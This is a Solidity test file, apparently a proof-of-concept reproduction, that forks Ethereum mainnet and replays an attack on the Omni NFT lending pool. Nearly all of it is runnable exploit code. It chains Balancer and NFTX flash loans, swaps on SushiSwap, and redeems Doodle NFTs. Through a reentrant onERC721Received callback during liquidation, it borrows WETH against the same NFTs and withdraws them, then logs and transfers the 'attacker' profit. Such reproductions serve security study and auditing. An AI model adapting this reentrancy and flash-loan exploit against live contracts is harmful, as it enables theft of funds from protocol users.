// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "./interface.sol";

interface IDOODLENFTXVault{

    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes memory data
    ) external returns (bool);
    function redeem(uint256 amount, uint256[] calldata specificIds)
        external
        returns (uint256[] calldata);
    function balanceOf(address account) external view returns (uint256);
    function mint(
        uint256[] calldata tokenIds,
        uint256[] calldata amounts /* ignored for ERC721 vaults */
    ) external returns (uint256);
}
interface ISushiSwap{

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes memory data
    ) external;
}
interface IOmni{

    function supplyERC721(
        address asset,
        DataTypes.ERC721SupplyParams[] memory tokenData,
        address onBehalfOf,
        uint16 referralCode
    ) external;

    function withdrawERC721(
        address asset,
        uint256[] memory tokenIds,
        address to
    ) external returns (uint256);
   function liquidationERC721(
        address collateralAsset,
        address liquidationAsset,
        address user,
        uint256 collateralTokenId,
        uint256 liquidationAmount,
        bool receiveNToken
    ) external;

    struct ERC721SupplyParams {
        uint256 tokenId;
        bool useAsCollateral;
    }
    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralBase,
            uint256 totalDebtBase,
            uint256 availableBorrowsBase,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor,
            uint256 erc721HealthFactor
        );

}
interface DataTypes {
    struct ERC721SupplyParams {
        uint256 tokenId;
        bool useAsCollateral;
    }
}

contract ContractTest is DSTest {

    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
    IERC721 doodlenft = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
    IBalancerVault  balancervault   = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IDOODLENFTXVault DOODLENFTXVault = IDOODLENFTXVault(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
    ISushiSwap SushiSwapRouter = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    IOmni OmniPool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
   // IOmni Pool = IOmni(0x50C7a557d408a5f5a7FDBE1091831728Ae7Eba45);
    bytes32 constant RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");
    address private constant NToken = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    NFTHolder NFTHolderContract;
    uint256 private nonce;
    constructor(){
        cheats.createSelectFork("mainnet", 15114361); // fork mainnet at block 15114361
        weth.approve(address(SushiSwapRouter),type(uint256).max);
        doodle.approve(address(SushiSwapRouter),type(uint256).max);
        weth.approve(address(OmniPool),type(uint256).max);
        doodlenft.setApprovalForAll(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9,true);
        doodlenft.setApprovalForAll(0x218615C78104e16B5F17764d35b905b638fe4a92,true);
        doodlenft.setApprovalForAll(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e,true);
        
    }
 
 
    function testExploit() public{
        NFTHolderContract = new NFTHolder();
        // flshloan 1,000 WETH
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint[] memory amounts = new uint[](1);
        amounts[0] =  1000*10**18;
        balancervault.flashLoan(address(this), tokens, amounts, '');
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    )
        external
    {
        tokens;
        amounts;
        feeAmounts;
        userData;
         // flashloan 20 DOODLE
        DOODLENFTXVault.flashLoan(address(this),address(doodle),20000000000000000000,'0x');
        uint weth_balance = weth.balanceOf(address(this));
        emit log_named_uint("Borrow WETH from balancer",weth_balance);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external  {
        uint weth_balance = weth.balanceOf(address(this));
        emit log_named_uint("Borrow WETH from balancer",weth_balance);
        uint doodle_balance = doodle.balanceOf(address(this));
        emit log_named_uint("Borrow DOODLE from balancer",doodle_balance);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(doodle);

        SushiSwapRouter.swapTokensForExactTokens(1000000000000000000,200000000000000000000,path,address(this),1657449026);

        emit log_named_uint("DOODLE Balance",doodle.balanceOf(address(this)));
        emit log_named_uint("WETH Balance",weth.balanceOf(address(this)));
        emit log_named_uint("DOODLE NFT ", doodlenft.balanceOf(address(this)));
        uint256[] memory _specificIds = new uint256[](20);
        _specificIds[0] = 4777;
        _specificIds[1] = 4784;
        _specificIds[2] = 2956;
        _specificIds[3] = 7806;
        _specificIds[4] = 4314;
        _specificIds[5] = 7894;
        _specificIds[6] = 9582;
        _specificIds[7] = 1603;
        _specificIds[8] = 4510;
        _specificIds[9] = 6932;
        _specificIds[10] = 1253;
        _specificIds[11] = 6760;
        _specificIds[12] = 9403;
        _specificIds[13] = 1067;
        _specificIds[14] = 179;
        _specificIds[15] = 4017;
        _specificIds[16] = 7165;
        _specificIds[17] = 720;
        _specificIds[18] = 5251;
        _specificIds[19] = 7425;
        DOODLENFTXVault.redeem(20,_specificIds);
        emit log_named_uint("DOODLE NFT ", doodlenft.balanceOf(address(this)));
        emit log_named_address("NFTHolderContract ", address(NFTHolderContract));
        uint256 length = _specificIds.length;

        for (uint256 i = 0; i < length; i++) {
            doodlenft.transferFrom(address(this), address(NFTHolderContract), _specificIds[i]);
        }
        NFTHolderContract.joker();

        uint256[] memory _amount = new uint256[](20);
 
        for (uint256 j = 0; j < _amount.length; j++) {
            _amount[j] = 0;
        }

        NFTHolderContract.withdrawAll();
        DOODLENFTXVault.mint(_specificIds, _amount);
        uint256 profit = getters();
        emit log_named_uint("Profit of attacker:", profit);
        payable(address(msg.sender)).transfer(profit);


    }

  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public returns (bytes4) {
    
     if(msg.sender == NToken) {
     emit log_string("Re entered");
     if (nonce == 21) {
     OmniPool.liquidationERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e,address(weth),0x23F8770bd80EFFA7F09dFfdc12A35B7221d5cad3,1067,100 ether,false);
     return this.onERC721Received.selector;
       
      } else if (nonce == 22) {
                uint256[] memory _specificIds = new uint256[](3);
                _specificIds[0] = 720;
                _specificIds[1] = 5251;
                _specificIds[2] = 7425;

                uint256 length = _specificIds.length;
                for (uint256 i = 0; i < length; i++) {
                    doodlenft.safeTransferFrom(address(this), address(NFTHolderContract), _specificIds[i]);
                }
                nonce = 1337;
                NFTHolderContract.attack();
            return this.onERC721Received.selector;

      }  else {
                nonce++;
                return this.onERC721Received.selector;
            }
        } else {
            return this.onERC721Received.selector;
        }
    }

 
  
    function getters() internal returns (uint256) {
        uint256[] memory _specificIds = new uint256[](20);
        _specificIds[0] = 4777;
        _specificIds[1] = 4784;
        _specificIds[2] = 2956;
        _specificIds[3] = 7806;
        _specificIds[4] = 4314;
        _specificIds[5] = 7894;
        _specificIds[6] = 9582;
        _specificIds[7] = 1603;
        _specificIds[8] = 4510;
        _specificIds[9] = 6932;
        _specificIds[10] = 1253;
        _specificIds[11] = 6760;
        _specificIds[12] = 9403;
        _specificIds[13] = 1067;
        _specificIds[14] = 179;
        _specificIds[15] = 4017;
        _specificIds[16] = 7165;
        _specificIds[17] = 720;
        _specificIds[18] = 5251;
        _specificIds[19] = 7425;

        uint256[] memory _amounts = new uint256[](20);
        _amounts[0] = 0;
        _amounts[1] = 0;
        _amounts[2] = 0;
        _amounts[3] = 0;
        _amounts[4] = 0;
        _amounts[5] = 0;
        _amounts[6] = 0;
        _amounts[7] = 0;
        _amounts[8] = 0;
        _amounts[9] = 0;
        _amounts[10] = 0;
        _amounts[11] = 0;
        _amounts[12] = 0;
        _amounts[13] = 0;
        _amounts[14] = 0;
        _amounts[15] = 0;
        _amounts[16] = 0;
        _amounts[17] = 0;
        _amounts[18] = 0;
        _amounts[19] = 0;

        weth.transfer(address(balancervault), 1000 ether);

        uint256 balance = weth.balanceOf(address(this));

        weth.withdraw(balance);

        return address(this).balance;
    }

    receive() external payable {}

}



   
contract NFTHolder {
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
    IERC721 doodlenft = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
    IBalancerVault  vault   = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IDOODLENFTXVault DOODLENFTXVault = IDOODLENFTXVault(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
    ISushiSwap SushiSwapRouter = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    IOmni OmniPool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
    IOmni Pool = IOmni(0x50C7a557d408a5f5a7FDBE1091831728Ae7Eba45);
    address deployer = msg.sender;

    constructor(){
        doodlenft.setApprovalForAll(address(OmniPool), true);
        weth.approve(address(OmniPool), type(uint256).max);
    }

    function joker() external  {
        DataTypes.ERC721SupplyParams[] memory _params = new DataTypes.ERC721SupplyParams[](3);

        _params[0].tokenId = 720;
        _params[0].useAsCollateral = true;

        _params[1].tokenId = 5251;
        _params[1].useAsCollateral = true;

        _params[2].tokenId = 7425;
        _params[2].useAsCollateral = true;

        OmniPool.supplyERC721(address(doodlenft), _params, address(this), 0);

        (,, uint256 amount,,,,) = OmniPool.getUserAccountData(address(this));

        OmniPool.borrow(address(weth), amount, 2, 0, address(this));

        uint256[] memory tokenIds = new uint256[](2);

        tokenIds[0] = 720;
        tokenIds[1] = 5251;

        OmniPool.withdrawERC721(address(doodlenft), tokenIds, address(deployer));
    }

    function attack() external returns (bool) {
        doodlenft.setApprovalForAll(address(OmniPool), true);

        DataTypes.ERC721SupplyParams[] memory _params = new DataTypes.ERC721SupplyParams[](20);

        _params[0].tokenId = 4777;
        _params[0].useAsCollateral = true;

        _params[1].tokenId = 4784;
        _params[1].useAsCollateral = true;

        _params[2].tokenId = 2956;
        _params[2].useAsCollateral = true;

        _params[3].tokenId = 7806;
        _params[3].useAsCollateral = true;

        _params[4].tokenId = 4314;
        _params[4].useAsCollateral = true;

        _params[5].tokenId = 7894;
        _params[5].useAsCollateral = true;

        _params[6].tokenId = 9582;
        _params[6].useAsCollateral = true;

        _params[7].tokenId = 1603;
        _params[7].useAsCollateral = true;       

        _params[8].tokenId = 4510;
        _params[8].useAsCollateral = true;       

        _params[9].tokenId = 6932;
        _params[9].useAsCollateral = true;     

        _params[10].tokenId = 1253;
        _params[10].useAsCollateral = true;

        _params[11].tokenId = 6760;
        _params[11].useAsCollateral = true;

        _params[12].tokenId = 9403;
        _params[12].useAsCollateral = true;  

        _params[13].tokenId = 1067;
        _params[13].useAsCollateral = true;     

        _params[14].tokenId = 179;
        _params[14].useAsCollateral = true;       

        _params[15].tokenId = 4017;
        _params[15].useAsCollateral = true;        

        _params[16].tokenId = 7165;
        _params[16].useAsCollateral = true;      

        _params[17].tokenId = 720;
        _params[17].useAsCollateral = true;                 

        _params[18].tokenId = 5251;
        _params[18].useAsCollateral = true;      

        _params[19].tokenId = 7425;
        _params[19].useAsCollateral = true;            

        OmniPool.supplyERC721(address(doodlenft), _params, address(this), 0);

        (,,uint256 amount,,,,) = OmniPool.getUserAccountData(address(this));

        OmniPool.borrow(address(weth), amount, 2, 0, address(this));

        return true;
    }

    function withdrawAll() external returns (bool) {
        uint256[] memory _specificIds = new uint256[](20);
        _specificIds[0] = 4777;
        _specificIds[1] = 4784;
        _specificIds[2] = 2956;
        _specificIds[3] = 7806;
        _specificIds[4] = 4314;
        _specificIds[5] = 7894;
        _specificIds[6] = 9582;
        _specificIds[7] = 1603;
        _specificIds[8] = 4510;
        _specificIds[9] = 6932;
        _specificIds[10] = 1253;
        _specificIds[11] = 6760;
        _specificIds[12] = 9403;
        _specificIds[13] = 1067;
        _specificIds[14] = 179;
        _specificIds[15] = 4017;
        _specificIds[16] = 7165;
        _specificIds[17] = 720;
        _specificIds[18] = 5251;
        _specificIds[19] = 7425;

        OmniPool.withdrawERC721(address(doodlenft), _specificIds, address(deployer));

        uint256 balance = weth.balanceOf(address(this));

        weth.transfer(address(deployer), balance);

        return true;
    } 

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

